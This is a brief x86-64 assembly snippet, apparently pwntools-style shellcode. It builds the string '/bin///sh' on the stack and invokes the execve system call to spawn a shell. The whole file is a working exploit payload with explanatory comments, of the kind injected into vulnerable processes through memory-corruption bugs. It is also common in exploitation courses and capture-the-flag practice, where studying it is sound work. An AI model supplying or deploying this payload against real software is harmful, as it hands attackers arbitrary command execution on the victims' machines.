bits 64
;/* push '/bin///sh\x00' */
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
;/* call execve(rsp, 0, 0) */
mov rdi, rsp
xor esi, esi
push 0x3b
pop rax
cdq ;/* Set rdx to 0, rax is known to be positive */
syscall
